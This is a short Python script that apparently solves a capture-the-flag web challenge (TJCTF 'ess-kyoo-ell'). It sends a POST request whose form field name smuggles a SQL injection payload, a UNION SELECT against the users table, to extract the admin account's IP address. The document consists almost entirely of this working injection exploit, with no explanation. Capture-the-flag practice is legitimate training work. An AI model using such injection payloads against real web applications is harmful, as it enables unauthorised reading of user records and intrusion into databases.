#!/usr/bin/env python

import requests

url = 'https://ess-kyoo-ell.tjctf.org/'

s = requests.Session()

r = s.get(url)
# print r.text

data = {
	"email" : "0",
	"id UNION SELECT ip_address,2,3,4,5,6,7 FROM users WHERE username='admin'--" : '',
}

r = s.post( url, data = data )
print r.text

s.close()